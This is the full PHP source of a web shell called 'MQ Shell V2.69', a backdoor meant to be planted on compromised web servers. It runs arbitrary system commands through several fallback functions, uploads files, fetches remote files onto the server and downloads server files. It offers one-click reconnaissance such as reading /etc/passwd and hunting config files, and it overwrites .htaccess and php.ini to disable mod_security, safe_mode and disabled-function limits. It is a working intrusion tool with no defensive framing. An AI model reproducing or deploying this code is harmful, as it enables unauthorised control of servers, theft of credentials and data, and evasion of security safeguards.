<?php
######################################
###[ MQ SHELL V2.69 BY MAQIECIOUS ]###
######################################

###[ HEADER FUNCTION ]###
function kepala(){
return '<html><head>
<title>'.@gettitle().'</title>
<!-- Powered by Maqiecious //-->
<meta name="robots" content="noindex, nofollow">
<style type="text/css" media="handheld, all">
<!-- body { background-color: #222; color: #ddd; margin: auto; font: normal normal 11px Helvetica, Arial, sans-serif; height: 100%; width: 100%; }
.logo { background-color:#eee; color: #343434; border: 2px solid #bbb; margin: 2px; text-align: center; font-weight: bold; padding: 4px; }
table { table-layout: fixed; }
.table, .info { background-color: #343434; border: 1px solid #000; margin: 2px; padding: 2px; }
.erro { background-color: #900; text-align: center; color: #ddd; border: 1px solid #000; margin: 2px; padding: 2px; }
.rez { background-color: #66a3d3; color: #000; border: 1px solid #222; margin: 2px; padding: 3px; }
.exist { background-color: #565656; color: #ddd; border: 1px solid #222; text-align: center; margin: 2px; padding: 3px; }
.hasil { background-color: #eee; color: #343434;
text-align: center; border: 1px solid #222; margin: 2px; padding: 3px; }
td { background-color:#454545; color: #ddd; font: normal normal 11px Helvetica, Arial, sans-serif; border:1px solid #555; margin: 2px; text-align: center; }
input, select, option { background-color:#333; color: #ddd; font: normal normal 11px Helvetica, Arial, sans-serif; border: 1px solid #222; margin: 2px; }
input[type="text"], input[type="file"], select, option { width: 135px; }
input[type="submit"] { width: 50px; }
.return { background-color: #66a3d3; color: #000; }
.return:hover { background-color: #222; color: #eee; }
textarea { width: 98%; background-color: #454545; color: #ddd; font: normal normal 11px Helvetica, Arial, sans-serif; border: 1px solid #555; margin: 2px; padding: 2px; } //--></style>
</head><body>
<div style="margin: 2 auto; max-width: 220px;"><div class="logo">SAFE MODE '.@modez().'</div>';
}
function kakiku(){
return '<div class="logo">BLUETOOTH - DLC CYBER</div>
</div></body></html>';
}

###[ HTML START ]###
if(!@empty($_GET['dl'])){ @download($_GET['dl']); }
if(@isset($_GET['info'])){ @phpinfo(); @die(); }
print(@kepala());
print('<div class="info"><div class="rez">'.@php_uname().'</div></div>');
print(@disfunc());

###[ DIRECTORY ]###
if(!@empty($_POST['dir'])){
$dir=getpwd($_POST['dir']);
if(!@chdir($dir)) $dir=getpwd($_POST['dir']);
} else {$dir=getpwd(@getcwd());}
if(@is_writable($dir)) $chd='Writable';
else $chd='Read-Only';
$edan=DIRECTORY_SEPARATOR;

###[ COMMANDS ]###
if(@$_POST['MQC']=='Execute'){
if(@empty($_POST['cmd'])) $cmd='ls';
else $cmd=$_POST['cmd'];
if(@$_POST['txt']=="txt"){
print('<div class="table" style="text-align: center;"><textarea rows="15">');
print(htmlspecialchars(@MQC($cmd)));
print('</textarea></div>');
} else {
print('<div class="info">
<div class="hasil" style="text-align: left; overflow: auto;">');
print(nl2br(htmlentities(@MQC($cmd),ENT_QUOTES)));
print('</div></div>');
}
} elseif(@$_POST['quick']=='Quick'){
$cmd=$_POST['com'];
if(@$_POST['txt']=="txt"){
print('<div class="table" style="text-align: center;"><textarea rows="15">');
print(htmlspecialchars(@MQC($cmd)));
print('</textarea></div>');
} else {
print('<div class="info">
<div class="hasil" style="text-align: left; overflow: auto;">');
print(nl2br(htmlentities(@MQC($cmd),ENT_QUOTES)));
print('</div></div>');
}
} elseif(@$_POST['upload']=='Upload'){
print('<div class="info"><div class="hasil">');
$filename=$_FILES['file']['name'];
$move=$dir.$filename;
if(!@move_uploaded_file($_FILES['file']['tmp_name'], $move)) print('<b style="color:#bb2222">UPLOAD ERROR</b><br/>'.$_FILES['file']['tmp_name'].'');
else print('<b style="color:#007800">FILE UPLOADED</b><br/>'.$move.'');
print('</div></div>');
} elseif(@$_POST['import']=='Import'){
print('<div class="info"><div class="hasil">');
$com=@explode('=>',$_POST['src']);
$url=@trim($com[0]);
$file=@trim($com[1]);
if(!@preg_match('/^(http:|https:|ftp:|ftps:|file:)/si',$_POST['src']) OR !@eregi('=>',$_POST['src']) OR @eregi('http://remotehost',$_POST['src'])){
print('<b style="color:#bb2222">IMPORT ERROR</b><br/>Syntax: http://remotehost => new_name');
} else {
$cop=@array($dir,$file);
$cop=@implode("",$cop);
if(!@copy($url,$cop)) print('<b style="color:#bb2222">IMPORT ERROR</b><br/>Copying: '.$url.' => '.$file.'');
else print('<b style="color:#007800">FILE IMPORTED</b><br/>'.$cop.'');
} print('</div></div>');
} elseif(@$_POST['bypazz']=='Change'){
if(!@empty($_POST['cox'])){
print('<div class="info"><div class="hasil">');
if(@$_POST['cox']=='hta'){
$hta=$dir.".htaccess";
@unlink($hta);
$buka=@fopen($hta,"w");
if($buka == true) {
print('<b style="color:#007800">HTACCESS PATCHED</b><br/>'.$hta);
@fwrite($buka,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off
</IfModule>");
} else { print('<b style="color:#bb2222">PATCH ERROR</b><br/>'.$hta);
}
@fclose($buka);
} elseif(@$_POST['cox']=='php'){
$ini=$dir."php.ini";
@unlink($ini);
$buka=@fopen($ini,"w");
if($buka == true) {
print('<b style="color:#007800">PHP.INI PATCHED</b><br/>'.$ini);
@fwrite($buka,"safe_mode=off
disable_functions=none
safe_mode_gid=off
open_basedir=off");
} else { print('<b style="color:#bb2222">PATCH ERROR</b><br/>'.$ini);
}
@fclose($buka);
} elseif(@$_POST['cox']=='ocx'){
$ocx=$dir.".htaccess";
@unlink($ocx);
$buka=@fopen($ocx,"w");
if($buka == true) {
print('<b style="color:#007800">FORCE PHP TO OCTET</b><br/>'.$ocx);
@fwrite($buka,'AddType application/octet-stream .php');
} else { print('<b style="color:#bb2222">FORCER ERROR</b><br/>'.$ocx);
}
@fclose($buka);
} elseif(@$_POST['cox']=='txt'){
$txt=$dir.".htaccess";
@unlink($txt);
$buka=@fopen($txt,"w");
if($buka == true) {
print('<b style="color:#007800">FORCE PHP TO TEXT</b><br/>'.$txt);
@fwrite($buka,'AddType text/plain .php');
} else { print('<b style="color:#bb2222">FORCER ERROR</b><br/>'.$txt);
}
@fclose($buka);
} elseif(@$_POST['cox']=='den'){
$den=$dir.".htaccess";
@unlink($den);
$buka=@fopen($den,"w");
if($buka == true) {
print('<b style="color:#007800">FORBID PHP FILES</b><br/>'.$den);
@fwrite($buka,'<Files "\.php$">
order deny, allow
deny from all
</Files>');
} else { print('<b style="color:#bb2222">FORBID PHP ERROR</b><br/>'.$den);
}
@fclose($buka);
} elseif(@$_POST['cox']=='rem'){
print('Selamat tinggal - Kita akan kenthu lagi dilain tempat');
@unlink($_SERVER['SCRIPT_FILENAME']);
}
print('</div></div>'); }
}

###[ FORM CMD ]###
print('<div class="table">
<table border="0" cellspacing="1">
<tr><td style="text-align: left">
<form method="post" enctype="multipart/form-data">
<input type="text" name="dir" value="'.$dir.'"></td>
<td style="width: 100%;"><span style="font-size: 9px;">'.$chd.'</span> </td></tr>
<tr><td style="text-align: left"><input type="text" name="cmd" value="'.@stripslashes(@htmlspecialchars(@$cmd)).'"></td>
<td style="width: 100%;"><input class="return" type="submit" name="MQC" value="Execute"></td></tr>
<tr><td style="text-align: left; padding: 0 4px;">&raquo; Select to use text area</td>
<td style="width: 100%;"><input type="checkbox" name="txt" value ="txt"');
if(@$_POST['txt']=="txt") print(" checked");
print('></td></tr>
<tr><td style="text-align: left">
<select name="com">
<option disabled="disabled" selected="selected" value="ls">=== Quick Commands ===</option>
<option value="cat /etc/passwd">Read etc passwd</option>
<option value="/sbin/ifconfig | grep inet">List IP server</option>
<option value="host -i '.@$_SERVER["HTTP_HOST"].'">Show DNS domain</option>
<option value="host -i '.@gethostbyname($_SERVER["HTTP_HOST"]).'">Show DNS by host</option>
<option value="ps x">List proccess</option>
<option value="crontab -l">List crontab</option>
<option value="find '.$dir.' -type f -name *config*.php">Find config files</option>
<option value="find '.$dir.' -type d -perm -2 | grep -v denied">Find writable dir</option>
<option value="uptime">Uptime server</option>
<option value="netstat -an | grep -i listen">Show opened ports</option>
</select></td>
<td style="width: 100%;"><input class="return" type="submit" name="quick" value="Quick"></td></tr>
<tr><td style="text-align: left">
<select name="cox">
<option disabled="disabled" selected="selected" value="">=== Quick Changes ===</option>
<option value="hta">Patch .htaccess</option>
<option value="php">Patch php.ini</option>
<option value="den">Forbid php files</option>
<option value="ocx">Force php to octet</option>
<option value="txt">Force php to text</option>
<option value="rem">Remove MQ shell</option>
</select></td>
<td style="width: 100%;"><input class="return" type="submit" name="bypazz" value="Change"></td></tr>
<tr><td style="text-align: left">
<input type="file" name="file">
<td style="width: 100%;"><input class="return" type="submit" name="upload" value="Upload"></td></tr>
<tr><td style="text-align: left">
<input type="text" name="src" value="http://remotehost => new_name">
<td style="width: 100%;"><input class="return" type="submit" name="import" value="Import"></td></tr>
<tr><td style="text-align: left"></form>
<form method="get">
<input type="text" name="dl" value="'.$dir.'"></td>
<td style="width: 100%;"><input class="return" type="submit" value="Export"></form></td></tr>
</table></div>');
print(@support());
print(@kakiku());

###[ FUNCTIONZ ]###
function download($me){
$name=strrchr($me,"/");
$name=str_replace("/","",$name);
$name=urldecode($name);
header("Pragma: public");
header("Expires: 0");
header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
header("Cache-Control: private", false);
header("Content-Disposition: attachment; filename=".$name);
header("Content-Type: application/force-download");
header("Content-Length: ".@filesize($me));
header("Content-Transfer-Encoding: binary");
readfile($me); exit();
}
function getpwd($dir){
if($p=strrpos($dir,'/')){
if($p!=strlen($dir)-1){
$d=$dir.'/';}
else{$d=$dir;}
}
elseif($p=strrpos($dir,'\\')){
if($p!=strlen($dir)-1){
$d=$dir.'\\';}
else{$d=$dir;}
}
else{$d=$dir.DIRECTORY_SEPARATOR;}
$d=@preg_replace("/\/+/","/",$d);
$d=@preg_replace("/\\+/","\\",$d);
return $d;
}
function support(){
$cobi="";
$coba=@MQC("which wget source lynx fetch curl lwp-download gcc c++ zip perl python mysql locate");
if($coba=="ERROR" OR $coba=="EOF")
print('<div class="info"><div class="erro">ERROR</div></div>');
if(@preg_match("/\//",$coba)){
$ex=explode("\n",$coba);
foreach ($ex as $x => $name){
if(!@eregi("which: no",$name)){
$name=strrchr($name,"/");
$name=str_replace("/","",$name);
$name=str_replace("-download","",$name);
$name=str_replace("c++","compiler",$name);
$cobi .= "$name ";
}
}
if(@is_file("/lib/ld-linux.so.2"))
$cobi .= "ld-linux.so.2";
print('<div class="info"><div class="rez" style="text-align: center;">'.$cobi.'</div></div>');
}
}
function gettitle(){
if(@php_uname() OR @function_exists("php_uname"))
$uname=@php_uname('n')." ".@php_uname('r')." ".@php_uname('v');
else $uname=@MQC("uname -nrv");
return @modez()." - ".$_SERVER['HTTP_HOST']." - $uname";
}
function modez(){
if(@ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode"))) return 'ON';
else return 'OFF';
}
function disfunc(){
if($diz=@ini_get("disable_functions")){
$rez=str_replace(',',', ',str_replace(' ',"",$diz));
return '<div class="info"><div class="erro">'.$rez.'</div></div>';
}
}
function getfunc(){
$disfunc=@ini_get("disable_functions");
if(!@empty($disfunc)){
$disfunc=str_replace(" ","",$disfunc);
$disfunc=explode(",",$disfunc);
} else { $disfunc=array(); }
return $disfunc;
}
function enabled($func){
if(@is_callable($func) AND !in_array($func,getfunc())) return true;
else return false;
}
function MQC($cmd){
$hasil="";
if(enabled("popen")){
$h=@popen($cmd.' 2>&1', 'r');
if(@is_resource($h)){
while (!feof($h)){ $hasil .= fread($h, 2096);  }
@pclose($h); }
} elseif(enabled("passthru")){
@ob_start(); passthru($cmd);
$hasil=@ob_get_contents();
@ob_end_clean();
} elseif(enabled("shell_exec")){
$hasil=@shell_exec($cmd);
} elseif(enabled("exec")){
@exec($cmd,$o);
$hasil=join("\r\n",$o);
} elseif(enabled("system")){
@ob_start();
@system($cmd);
$hasil=@ob_get_contents();
@ob_end_clean();
} elseif(extension_loaded('perl')){
$hasil=@perlshell($cmd);
} elseif(extension_loaded('python')){
$hasil=@python_eval("import os
os.system('".$cmd."')");
} else { $hasil="ERROR"; }
if($hasil=="") $hasil="EOF";
return trim($hasil);
}

######################################
###[ MQ SHELL V2.69 BY MAQIECIOUS ]###
######################################
exit;
